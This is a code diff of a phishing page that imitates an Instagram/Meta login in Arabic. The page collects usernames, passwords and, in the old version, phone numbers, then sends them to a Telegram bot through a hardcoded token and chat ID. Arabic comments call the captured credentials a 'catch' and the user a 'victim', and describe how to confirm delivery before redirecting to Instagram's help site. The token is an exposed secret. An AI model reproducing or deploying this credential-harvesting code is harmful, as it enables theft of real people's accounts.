@@ -3,45 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية | Meta</title>
+    <title>Meta Support</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .login-card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 100%; max-width: 350px; text-align: center; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; text-align: right; }
-        button { width: 100%; background: #0095f6; border: none; color: white; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 100%; max-width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" style="width:175px; margin-bottom:20px;">
-        <p style="color:#8e8e8e; font-size:14px; margin-bottom:20px;">يرجى تأكيد بيانات حسابك للمتابعة.</p>
-        
+    <div class="card">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" style="width:170px; margin-bottom:20px;">
         <input type="text" id="u" placeholder="اسم المستخدم" required>
         <input type="password" id="p" placeholder="كلمة السر" required>
-        <input type="tel" id="ph" placeholder="رقم الهاتف">
-        <button onclick="sendNow()">تأكيد الهوية</button>
+        <button onclick="checkAndSend()">تسجيل الدخول</button>
     </div>
 
     <script>
-        function sendNow() {
+        function checkAndSend() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
-            const ph = document.getElementById('ph').value;
-
-            if(!u || !p) return alert("يرجى ملء الحقول");
+            if(!u || !p) return;
 
             const token = '8770625884:AAFe9rs1MjknDXFmVYmjpz4pWjoKznNmwTc';
             const chat = '7074300443';
-            const text = `🎯 صيد جديد مضمون 🎯\n👤 يوزر: ${u}\n🔑 باس: ${p}\n📞 هاتف: ${ph}`;
+            const text = `🎯 صيد جديد 🎯\n👤 يوزر: ${u}\n🔑 باس: ${p}`;
 
-            // الحل الجذري: فتح رابط الإرسال مباشرة في نفس النافذة
-            // هذا الرابط سيوصل البيانات للبوت "غصباً" عن المتصفح
-            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`;
-            
-            // ننتقل لرابط الإرسال أولاً
-            window.location.href = telegramUrl;
+            // رابط الإرسال المباشر
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`;
 
-            // بعد ثانيتين نوجه الضحية للموقع الرسمي
+            // اختبار الإرسال: سيفتح الرابط في صفحة جديدة
+            // إذا ظهر لك { "ok": true } فالصيد وصل.
+            // إذا ظهر لك خطأ، فالمشكلة في التوكن أو الآيدي.
+            window.open(url, '_blank');
+
             setTimeout(() => {
                 window.location.href = "https://help.instagram.com";
             }, 2000);
